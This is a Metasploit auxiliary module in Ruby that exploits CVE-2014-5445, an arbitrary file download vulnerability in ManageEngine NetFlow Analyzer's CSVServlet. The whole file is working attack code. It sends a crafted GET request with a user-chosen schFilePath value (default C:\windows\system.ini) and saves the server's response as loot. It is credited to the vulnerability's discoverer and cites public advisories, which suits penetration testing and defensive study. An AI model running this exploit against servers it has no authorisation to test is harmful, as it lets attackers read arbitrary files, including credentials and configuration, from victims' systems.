##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'ManageEngine NetFlow Analyzer Arbitrary File Download',
      'Description'    => %q{
        This module exploits an arbitrary file download vulnerability in CSVServlet
        on ManageEngine NetFlow Analyzer. This module has been tested on both Windows
        and Linux with versions 8.6 to 10.2. Note that when typing Windows paths, you
        must escape the backslash with a backslash.
      },
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2014-5445' ],
          [ 'OSVDB', '115340' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Dec/9' ],
          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_netflow_it360_file_dl.txt' ]
        ],
      'DisclosureDate' => 'Nov 30 2014'))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI',
          [ true, "The base path to NetFlow Analyzer", '/netflow' ]),
        OptString.new('FILEPATH', [true, 'Path of the file to download', 'C:\\windows\\system.ini']),
      ])
  end


  def run
    # Create request
    begin
      print_status("Downloading file #{datastore['FILEPATH']}")
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(datastore['TARGETURI'], 'servlet', 'CSVServlet'),
        'vars_get' => { 'schFilePath' => datastore['FILEPATH'] },
      })
    rescue Rex::ConnectionError
      print_error("Could not connect.")
      return
    end

    # Show data if needed
    if res && res.code == 200
      if res.body.to_s.bytesize == 0
        print_error("0 bytes returned, file does not exist or it is empty.")
        return
      end
      vprint_line(res.body.to_s)
      fname = File.basename(datastore['FILEPATH'])

      path = store_loot(
        'netflow.http',
        'application/octet-stream',
        datastore['RHOST'],
        res.body,
        fname
      )
      print_good("File saved in: #{path}")
    else
      print_error("Failed to download file.")
    end
  end
end
